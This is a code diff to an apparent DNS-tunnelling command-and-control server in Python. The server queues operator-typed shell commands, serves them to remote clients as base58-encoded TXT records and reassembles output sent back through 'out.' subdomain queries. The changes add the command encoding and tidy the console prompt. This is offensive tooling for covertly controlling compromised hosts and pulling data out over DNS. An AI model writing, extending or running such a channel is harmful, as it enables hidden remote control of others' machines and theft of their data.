@@ -25,7 +25,7 @@ class TunnelResolver(BaseResolver):
                 command_txt = q_commands.get(block=False, timeout=None)
             except queue.Empty:
                 command_txt = ""
-            reply.add_answer(*RR.fromZone("{} 60 IN TXT \"{}\"".format(qname, command_txt)))
+            reply.add_answer(*RR.fromZone("{} 60 IN TXT \"{}\"".format(qname, base58.b58encode(command_txt.encode("utf-8")).decode("ascii"))))
         elif request.q.qtype == 1 and ("out." + domain + ".") in qstr:
             self.__parse_out(qstr)
             reply.add_answer(*RR.fromZone("{} 3600 IN A {}".format(qname, "127.255.255.255")))
@@ -87,7 +87,6 @@ class TunnelResolver(BaseResolver):
                 print(self.__buffer[i].decode("ascii"), end="")
             else:
                 missing_packet = True
-        print()
 
         if missing_packet:
             print("[!] Some packets are missing!")
@@ -134,6 +133,6 @@ if args.tcp:
     tcp_server.start_thread()
 
 while udp_server.isAlive():
-    command = input("$ ")
+    command = input()
     if len(command) <= 255 and len(command) > 0:
         q_commands.put(command)
